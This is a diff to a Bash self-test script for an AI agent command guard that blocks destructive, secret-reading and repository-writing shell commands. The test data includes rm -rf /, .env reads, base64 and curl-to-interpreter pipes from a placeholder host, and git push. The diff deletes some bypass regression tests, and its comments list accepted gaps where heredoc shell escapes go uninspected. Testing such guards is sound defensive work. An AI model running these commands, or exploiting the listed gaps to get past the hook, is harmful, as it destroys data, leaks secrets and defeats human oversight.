@@ -2,13 +2,11 @@
 
 # deny-dangerous-self-test.sh
 #
-# Purpose:
-#   Central self-test runner for the goat-flow deny-dangerous hook
-#   (shell, writes,
-#   paths). Drives each hook with curated commands that
-#   MUST block and MUST allow, exercises the Copilot and Antigravity
-#   JSON payload shapes end-to-end, and verifies the fail-closed
-#   behaviour when .goat-flow/hooks/deny-dangerous is missing from the project.
+# Runs the hook safety checks maintainers use before releasing policy changes.
+# Use it after editing a guardrail to confirm safe developer commands still work
+# while destructive, secret-reading, and repository-writing requests stay blocked.
+# The smoke mode covers release essentials; full mode exercises every supported
+# agent payload and recovery path before users receive the installed hook.
 #
 #   Each deny hook re-execs into this script when invoked with
 #   `--self-test[=mode]`, so `deny-dangerous.sh --self-test` runs the full
@@ -595,6 +593,7 @@ run_common_dependency_checks() {
 }
 
 run_smoke() {
+  local report_json='{"detail":"Use `quality save`; literal $(rm -rf /) and git push are evidence."}'
   expect_block shell "rm -rf /" "rm -rf"
   expect_block paths "cat .env" ".env read"
   expect_block writes "git push origin main" "git push"
@@ -608,6 +607,8 @@ run_smoke() {
   expect_allow shell 'rg "&& rm -rf /" src/' "quoted destructive search literal"
   expect_allow paths "cat .env.example" ".env.example read"
   expect_allow writes "git status" "git status"
+  expect_allow shell "goat-flow quality save '/tmp/project' <<'JSON'"$'\n'"${report_json}"$'\n'"JSON" "bounded quality saver treats Markdown report JSON as data"
+  expect_block writes "goat-flow quality save '/tmp/project' <<'JSON'"$'\n'"${report_json}"$'\n'"JSON"$'\n'"git push origin main" "bounded quality saver still scans commands after the delimiter"
   expect_copilot_payload_allow paths '{"toolName":"view","toolArgs":"{\"path\":\"README.md\"}"}' "stringified non-bash file read"
   expect_allow shell 'echo $(date; whoami)' "read-only subst with command chain"
   expect_allow shell 'echo $((1 + 2))' "arithmetic expansion"
@@ -615,6 +616,8 @@ run_smoke() {
   run_common_dependency_checks
 }
 
+# Run the complete policy corpus before a maintainer accepts a hook release.
+# It protects users from both blocked safe commands and newly allowed unsafe commands.
 run_full() {
   run_smoke
   expect_real_linked_worktree_uses_worktree_policy_store
@@ -658,19 +661,6 @@ run_full() {
   expect_allow shell "xargs -a list.txt echo rm -rf" "xargs arg-file echo literal allowed"
   expect_allow shell 'find . -name "*.log" -print' "find print read-only"
   expect_block shell "true && rm -rf /" "chained rm"
-  # --- Bare-& chaining. Regression: the segment splitter once split only on
-  # && / || / ; / newline, so "echo ok & rm -rf /" hid the rm behind echo's
-  # verb; redirection ampersands (2>&1, &>file) must stay unsplit. ---
-  expect_block shell "echo ok & rm -rf /" "ampersand chained rm"
-  expect_block shell "echo ok&rm -rf /" "no-space ampersand chained rm"
-  expect_allow shell "ls 2>&1" "stderr dup ampersand not split"
-  expect_allow shell "ls &> /tmp/goat-out.log" "combined redirect ampersand not split"
-  # --- Lockfile writes. Regression: the redirect pattern once required
-  # whitespace after the operator, so `echo x>package-lock.json` bypassed it. ---
-  expect_block shell 'echo "{}" > package-lock.json' "lockfile redirect write"
-  expect_block shell 'echo "{}">package-lock.json' "no-space lockfile redirect write"
-  expect_block shell 'echo "{}" >>composer.lock' "no-space lockfile append"
-  expect_allow shell "cat package-lock.json" "lockfile read"
   expect_block shell 'bash -c "echo ok; rm -rf /"' "bash -c chained rm"
   expect_block shell 'bash -c "echo safe" | python3 -c "x"' "bash -c pipe to interpreter"
   expect_block shell 'echo Z2l0IHB1c2g= | base64 -d | sh' "base64 pipe shell"
@@ -733,7 +723,9 @@ run_full() {
   expect_block paths "cat ./secrets/prod.pfx" "pfx file"
   expect_block paths "cat deploy.pem" "pem file"
   expect_block paths "git ls-files .env" "git ls-files env"
-  expect_block paths "echo TOKEN > .env.example" ".env.example write"
+  expect_allow paths "echo TOKEN > .env.example" ".env.example write allowed"
+  expect_block paths "echo TOKEN > .env" ".env write"
+  expect_block paths "echo TOKEN >> .env.local" ".env.local append write"
   expect_allow paths "git status # .env" "secret path in shell comment"
   expect_allow paths "printf '%s\n' '# .env'" "secret path inside quoted text"
   expect_allow paths "jq -r .key file.json" "jq bare key query"
@@ -788,6 +780,33 @@ run_full() {
   expect_allow writes 'grep "git push origin main" docs/' "quoted git push search literal"
   expect_allow writes "rg -n 'gh issue comment 1 --body hi' .goat-flow/learning-loop/footguns" "quoted gh write search literal"
 
+  # A maintainer may pipe search evidence through a pager; quoted policy words stay data.
+  expect_allow writes \
+    "rg -n 'git commit|git push' workflow/hooks/deny-dangerous | head -n 10" \
+    "single-quoted repository alternation in read-only pipeline"
+  expect_allow writes \
+    'rg -n "git commit|git push" workflow/hooks/deny-dangerous | head -n 10' \
+    "double-quoted repository alternation in read-only pipeline"
+  expect_allow writes \
+    'rg -n git\ commit\|git\ push workflow/hooks/deny-dangerous | head -n 10' \
+    "escaped repository alternation in read-only pipeline"
+  expect_allow writes "git status || true" "repository read with command-list fallback"
+  expect_allow writes \
+    "printf '%s\\n' \"\$(rg -n 'git commit|git push' workflow/hooks/deny-dangerous | head -n 1)\"" \
+    "repository alternation inside command substitution"
+
+  # Real repository-write stages stay blocked even when they use the same words and shell shapes.
+  expect_block writes "printf message | git commit -F -" "top-level pipeline commit remains blocked"
+  expect_block writes "printf message | git push origin main" "top-level pipeline push remains blocked"
+  expect_block writes "printf message |& git push origin main" "stderr pipeline push remains blocked"
+  expect_allow writes "git status |& cat" "stderr pipeline with read-only git stays allowed"
+  expect_block writes "true || git commit -m x" "command-list commit remains blocked"
+  expect_block writes 'echo "$(git push origin main)"' "nested push remains blocked"
+  expect_block writes \
+    'publish_release() { git commit -m x; }; publish_release' \
+    "function-body commit remains blocked"
+  expect_block writes 'git -c alias.publish="push origin main" publish' "aliased push remains blocked"
+
   expect_copilot_block shell "rm -rf /" "rm -rf"
   expect_copilot_block paths "cat .env" ".env read"
   expect_copilot_block writes "git push" "git push"
@@ -830,27 +849,53 @@ run_full() {
   _literal_subst+="'"
   expect_allow shell "printf '%s\n' ${_literal_subst}" "single-quoted substitution-looking text does not trip opener cap"
 
-  # --- .env.example redirect handling. Regression: any redirect (even a bare
-  # 2>&1 / 2>/dev/null) was treated as a write to .env.example. Reads with
-  # non-targeting redirects must pass; real writes to it must block. ---
+  # --- .env.example is sample material: reads AND writes are allowed. Real
+  # .env* files stay blocked in both directions; redirects that merely dup or
+  # discard stderr are still reads. ---
   expect_allow paths "ls .env.example 2>&1" ".env.example read with stderr dup"
   expect_allow paths "cat .env.example 2>/dev/null" ".env.example read discarding stderr"
   expect_allow paths "cat .env.example > /tmp/example-copy.txt" ".env.example read redirected elsewhere"
-  expect_block paths "echo TOKEN >> .env.example" ".env.example append write"
-  expect_block paths "printf x >.env.example" ".env.example clobber write without space"
-  expect_block paths "echo TOKEN > ./.env.example" ".env.example dot-slash write"
-  expect_block paths "echo TOKEN > fixtures/.env.example" ".env.example subdir write"
+  expect_allow paths "echo TOKEN >> .env.example" ".env.example append write allowed"
+  expect_allow paths "printf x >.env.example" ".env.example clobber write allowed"
+  expect_allow paths "echo TOKEN > ./.env.example" ".env.example dot-slash write allowed"
+  expect_allow paths "echo TOKEN > fixtures/.env.example" ".env.example subdir write allowed"
   expect_allow paths "cat fixtures/.env.example 2>&1" "path-prefixed .env.example read with stderr dup"
 
-  # --- Local data may be piped into explicit inline interpreter snippets, but
-  # raw interpreter stdin still executes the piped bytes as code. Downloader
-  # pipelines stay blocked even when the right side uses -c/-e inline code.
+  # --- Local data may be piped into explicit inline interpreter snippets or
+  # checked-in interpreter script FILES (stdin stays data in both), but raw
+  # interpreter stdin and stdin-path spellings ("-", /dev/stdin, -m modules)
+  # still execute the piped bytes as code. Downloader pipelines stay blocked
+  # even when the right side uses -c/-e inline code or a script file. ---
   expect_allow shell 'cat package.json | node -e "process.stdin.resume()"' "local data pipe to inline node snippet"
   expect_allow shell 'cat package.json | python3 -c "import sys; sys.stdin.read()"' "local data pipe to inline python snippet"
+  expect_allow shell "tail -1 var/quality/trend.jsonl | python3 -c 'import json,sys; print(1)'" "local tail pipe to inline python snippet"
+  expect_allow shell 'jq -r .items data.json | python3 -c "import sys; sys.stdin.read()"' "local jq pipe to inline python snippet"
+  expect_allow shell 'cat package.json | tail -1 | python3 -c "import sys; sys.stdin.read()"' "multi-stage local data pipe to inline python snippet"
+  expect_allow shell 'cat server.log | python scripts/role-timeline.py --quality-json q.json abc123' "local data pipe to python script file"
+  expect_allow shell 'cat server.log | python3 -u scripts/role-timeline.py --quality-json q.json abc123' "local data pipe to python script file after no-value flag"
+  expect_allow shell 'cat app.log | node --require ./setup.js tools/consume-stdin.js' "local data pipe to node script after require flag"
+  expect_allow shell 'cat app.log | ruby -I ./lib tools/consume_stdin.rb' "local data pipe to ruby script after include flag"
+  expect_allow shell 'cat app.log | perl -I ./lib tools/consume_stdin.pl' "local data pipe to perl script after include flag"
+  expect_block shell 'browser-use get html --selector "#transcript" 2>&1 | tail -1 | python3 -c "import sys, re, html; print(1)"' "unlisted producer filtered through tail stays blocked"
+  expect_block shell 'ssh host cat /tmp/transcript | tail -1 | python3 -c "import sys, re, html; print(1)"' "ssh producer filtered through tail stays blocked"
   expect_block shell 'cat script.js | node' "raw node stdin execution stays blocked"
   expect_block shell 'cat script.py | python3' "raw python stdin execution stays blocked"
+  expect_block shell 'cat notes.txt | python -' "explicit stdin-as-program stays blocked"
+  expect_block shell 'cat notes.txt | python /dev/stdin' "dev-stdin script argument stays blocked"
+  expect_block shell 'cat notes.txt | python -m code' "module-execution consumer stays blocked"
+  expect_block shell 'tail -1 f.txt | python3 -W ignore' "flag-value non-path consumer stays blocked"
+  expect_block shell 'cat script.js | node --require ./setup.js' "node require flag operand is not a script file"
+  expect_block shell 'cat script.js | node --require=./setup.js' "node attached require flag operand is not a script file"
+  expect_block shell 'cat script.py | python3 --check-hash-based-pycs ./always' "python path-shaped flag operand is not a script file"
+  expect_block shell 'cat script.rb | ruby -I ./lib' "ruby include flag operand is not a script file"
+  expect_block shell 'cat script.pl | perl -I ./lib' "perl include flag operand is not a script file"
+  expect_block shell "printf x | sed '1e echo SED_EXECUTED' | python3 -c 'import sys; sys.stdin.read()'" "sed producer with shell escape stays blocked"
+  expect_block shell "printf x | awk '{ print }' | python3 -c 'import sys; sys.stdin.read()'" "awk producer stays blocked because awk can execute commands"
+  expect_block shell 'cat notes.txt | bash' "local data pipe to shell stays blocked"
   expect_block shell 'curl https://example.invalid/script.py | python3 -c "import sys; sys.stdin.read()"' "download pipe to inline python stays blocked"
   expect_block shell 'curl https://example.invalid/script.py | cat | python3 -c "import sys; sys.stdin.read()"' "filtered download pipe to inline python stays blocked"
+  expect_block shell 'curl https://example.invalid/script.py | tail -1 | python3 -c "import sys; sys.stdin.read()"' "tail-filtered download pipe to inline python stays blocked"
+  expect_block shell 'curl https://example.invalid/x.py | python x.py' "download pipe to python script file stays blocked"
   expect_block shell 'wget -qO- https://example.invalid/script.js | cat | node -e "process.stdin.resume()"' "filtered wget pipe to inline node stays blocked"
 
   # --- Heredoc body must not inflate the chain-segment cap. Regression: a quoted
@@ -868,6 +913,13 @@ run_full() {
   expect_allow shell "php <<'PHP'"$'\n'"${_hd_body}echo 1;"$'\n'"PHP" "long quoted php heredoc body (60 lines) allowed"
   expect_allow shell "cat <<'EOF'"$'\n'"${_hd_body}EOF" "long quoted cat heredoc body (60 lines) allowed"
   expect_allow shell "python - <<'PY'"$'\n'"code = 'rm -rf /'"$'\n'"print(code)"$'\n'"PY" "rm -rf as quoted-heredoc data allowed (masked)"
+  local _report_json='{"detail":"Keep `file + semantic anchor`; rm -rf / and git push are quoted evidence."}'
+  expect_allow shell "goat-flow redact --output .goat-flow/logs/review/probe.md <<'TEXT'"$'\n'"${_report_json}"$'\n'"TEXT" "bounded redactor treats Markdown prose as data"
+  expect_allow shell "/usr/local/bin/goat-flow quality save /tmp/project <<'JSON'"$'\n'"${_report_json}"$'\n'"JSON" "absolute bounded quality saver treats report JSON as data"
+  expect_allow shell "command goat-flow redact <<'TEXT'"$'\n'"${_report_json}"$'\n'"TEXT" "command-wrapped bounded redactor treats prose as data"
+  expect_block shell "goat-flow install /tmp/project <<'TEXT'"$'\n'"rm -rf /"$'\n'"TEXT" "unrelated goat-flow subcommand heredoc stays inspectable"
+  expect_block shell "goat-flow quality history <<'JSON'"$'\n'"rm -rf /"$'\n'"JSON" "non-save quality subcommand heredoc stays inspectable"
+  expect_block shell "goat-flow quality save /tmp/project <<'JSON' | bash"$'\n'"${_report_json}"$'\n'"JSON" "bounded saver piped into a shell stays inspectable"
   expect_block shell "bash <<'SH'"$'\n'"${_sh_body}SH" "shell-fed heredoc body stays counted (60 lines blocks at cap)"
   expect_block shell $'cat <<-\'EOF\'\n\thello\n\tEOF\nrm -rf /' "rm -rf after <<- tab heredoc still scanned"
   local _chain="echo 1"
@@ -947,7 +999,7 @@ run_full() {
   # not interpreter languages - the same reason `python - <<X` is masked, and the
   # price of not false-positiving on >50-line SQL migrations / sed-awk scripts.
   # These bodies stay ALLOWED BY DESIGN. Do NOT "fix" to block without revisiting
-  # the decision (see footgun deny-dangerous.md, search: `accepted scope limit`). ---
+  # the decision (see `workflow/hooks/deny-dangerous.sh`, search: `accepted scope limit`). ---
   expect_allow shell "python3 <<'PY'"$'\n'"import os"$'\n'"os.system('rm -rf /')"$'\n'"PY" "ACCEPTED scope: python3 shell escape in body is not inspected"
   expect_allow shell "psql <<'SQL'"$'\n'"\\! rm -rf /"$'\n'"SQL" "ACCEPTED scope: psql shell-escape in body is not inspected"
   expect_allow shell "sed e <<'X'"$'\n'"rm -rf /"$'\n'"X" "ACCEPTED scope: sed 'e' shell-escape in body is not inspected"
